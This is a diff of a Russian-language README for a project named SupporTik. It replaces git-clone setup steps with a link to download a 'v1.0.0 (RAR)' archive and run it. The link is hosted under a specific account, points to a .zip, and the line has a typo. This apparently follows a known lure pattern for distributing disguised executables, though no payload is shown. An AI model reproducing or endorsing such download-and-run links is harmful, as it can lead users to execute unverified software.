@@ -28,6 +28,4 @@
 
 ## 🚀 Быстрый запуск
 
-1. Клонируйте репозиторий:
-   ```bash
-   git clone [https://github.com/ВАШ_НИК/SupporTik.git](https://github.com/ВАШ_НИК/SupporTik.git)
+[📥 Скачачайте SupporTik v1.0.0 (RAR)](https://github.com/Legothommo/SupporTik/archive/refs/tags/1.0.0.zip) и запустите
